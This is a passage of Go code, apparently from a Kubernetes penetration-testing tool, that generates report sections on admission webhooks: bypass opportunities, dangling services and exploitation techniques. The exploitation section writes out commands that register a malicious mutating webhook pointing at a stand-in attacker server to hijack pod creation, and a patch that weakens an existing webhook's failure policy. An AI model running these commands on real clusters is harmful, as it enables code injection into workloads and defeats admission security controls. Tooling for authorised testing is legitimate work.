		section.Addf("# Webhooks in chain: %d", len(webhooks))
		for i, wh := range webhooks {
			section.Addf("#   %d. %s", i+1, wh)
		}
	}
}

func buildBypassLoot(loot *shared.LootBuilder, bypasses []BypassOpportunity, kubeContext string) {
	section := loot.Section("Webhook-Bypass-Opportunities")
	section.SetHeader(`#####################################
##### Webhook Bypass Opportunities
#####################################
#
# Identified bypass techniques
#`)

	if kubeContext != "" {
		section.Addf("kubectl config use-context %s", kubeContext)
		section.AddBlank()
	}

	if len(bypasses) == 0 {
		section.AddBlank()
		section.Add("# No bypass opportunities detected")
		section.AddBlank()
		return
	}

	section.AddBlank()
	section.Addf("## BYPASS OPPORTUNITIES (%d found)", len(bypasses))
	section.AddBlank()

	for _, b := range bypasses {
		section.AddBlank()
		section.Addf("### [%s] %s: %s", b.RiskLevel, b.WebhookType, b.WebhookName)
		section.Addf("# Bypass Type: %s", b.BypassType)
		section.Addf("# Method: %s", b.BypassMethod)
		section.Addf("# Exploit: %s", b.ExploitCommand)
	}
}

func buildServiceValidationLoot(loot *shared.LootBuilder, findings []WebhookFinding, kubeContext string) {
	section := loot.Section("Webhook-Service-Validation")
	section.SetHeader(`#####################################
##### Webhook Service Validation
#####################################
#
# Service existence and endpoint health
#`)

	if kubeContext != "" {
		section.Addf("kubectl config use-context %s", kubeContext)
		section.AddBlank()
	}

	dangling := []WebhookFinding{}
	noEndpoints := []WebhookFinding{}

	for _, f := range findings {
		if f.ServiceDangling {
			dangling = append(dangling, f)
		} else if f.ServiceExists && f.EndpointCount == 0 {
			noEndpoints = append(noEndpoints, f)
		}
	}

	if len(dangling) > 0 {
		section.AddBlank()
		section.Addf("## DANGLING WEBHOOKS (%d found)", len(dangling))
		section.AddBlank()
		section.Add("# These webhooks reference non-existent services")
		section.AddBlank()
		for _, f := range dangling {
			section.AddBlank()
			section.Addf("### %s: %s", f.Type, f.Name)
			section.Addf("# Expected: %s/%s (DOES NOT EXIST)", f.Namespace, f.Service)
		}
	}

	if len(noEndpoints) > 0 {
		section.AddBlank()
		section.Addf("## NO ENDPOINTS (%d found)", len(noEndpoints))
		section.AddBlank()
		for _, f := range noEndpoints {
			section.AddBlank()
			section.Addf("### %s: %s", f.Type, f.Name)
			section.Addf("# Service: %s/%s (no endpoints)", f.Namespace, f.Service)
		}
	}
}

func buildExploitationLoot(loot *shared.LootBuilder, findings []WebhookFinding, kubeContext string) {
	section := loot.Section("Webhook-Exploitation")
	section.SetHeader(`#####################################
##### Webhook Exploitation Techniques
#####################################
#
# MANUAL EXECUTION REQUIRED
# Educational purposes - use responsibly
#`)

	if kubeContext != "" {
		section.Addf("kubectl config use-context %s", kubeContext)
		section.AddBlank()
	}

	section.AddBlank()
	section.Add("## 1. Deploy Malicious Webhook")
	section.Add("# If you can create webhook configurations:")
	section.AddBlank()
	section.Add("cat <<EOF | kubectl apply -f -")
	section.Add("apiVersion: admissionregistration.k8s.io/v1")
	section.Add("kind: MutatingWebhookConfiguration")
	section.Add("metadata:")
	section.Add("  name: malicious-webhook")
	section.Add("webhooks:")
	section.Add("- name: inject.malicious.com")
	section.Add("  clientConfig:")
	section.Add("    url: https://attacker-server.com/mutate")
	section.Add("  rules:")
	section.Add("  - operations: [\"CREATE\"]")
	section.Add("    apiGroups: [\"\"]")
	section.Add("    apiVersions: [\"v1\"]")
	section.Add("    resources: [\"pods\"]")
	section.Add("  admissionReviewVersions: [\"v1\"]")
	section.Add("  sideEffects: None")
	section.Add("  failurePolicy: Ignore")
	section.Add("EOF")
	section.AddBlank()
	section.Add("## 2. Modify Existing Webhook")
	section.Add("# Change failurePolicy to bypass:")
	section.Add("kubectl patch mutatingwebhookconfiguration <name> -p '{\"webhooks\":[{\"name\":\"<webhook>\",\"failurePolicy\":\"Ignore\"}]}'")
	section.AddBlank()
	section.Add("## 3. External Webhooks Found:")

	for _, f := range findings {
		if f.IsExternal {
			section.Addf("# - %s: %s -> %s", f.Type, f.Name, f.Path)
		}
	}
}

func webhooksMin(a, b int) int {
	if a < b {
		return a
	}
	return b
}
